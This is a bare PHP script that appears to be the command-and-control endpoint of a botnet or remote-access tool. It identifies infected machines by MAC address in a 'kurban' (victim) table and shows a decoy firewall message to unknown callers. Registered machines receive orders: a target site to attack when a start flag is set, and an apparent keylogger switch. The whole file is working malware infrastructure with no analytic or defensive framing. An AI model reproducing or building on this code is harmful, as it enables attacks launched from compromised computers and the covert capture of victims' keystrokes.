<?php

include("vt.php");
  ob_start();


	$cekilen_id=htmlspecialchars(strip_tags($_GET["id"]));
	
	$sorgu = $db->prepare("SELECT * FROM kurban WHERE macadres=:id");				//istenilen id deki veriyi çekme
		$sorgu->execute(array(':id'=>$cekilen_id));
		
		if(empty($sorgu->rowCount())){?>
			
			<b>Your firewall is running.</b>
		
		<?php
		
		
		
		
		}else{
			
			$id = '1';
	
		$sorgu = $db->prepare("SELECT * FROM genel WHERE id=:id");				//istenilen id deki veriyi çekme
		$sorgu->execute(array(':id'=>$id));
		if($sorgu->rowCount()){
			$row=$sorgu->fetch(PDO::FETCH_ASSOC);


if($row['baslat']==1){echo 'attack?www.google.com<br>';}else{echo 'attack?0<br>';}}


$sorgu = $db->prepare("SELECT * FROM kurban WHERE macadres=:id");				//istenilen id deki veriyi çekme
		$sorgu->execute(array(':id'=>$cekilen_id));
		if($sorgu->rowCount()){
			$row1=$sorgu->fetch(PDO::FETCH_ASSOC);
		if($row1['komut']==2){echo 'key?1<br>';}else{echo 'key?0<br>';}		if($row1['hata']==3){echo "hata?".$row1['mesag']."<br>";}		}
			
			
		}?>
		
		
		
		<?php
		
		ob_end_flush();
?>







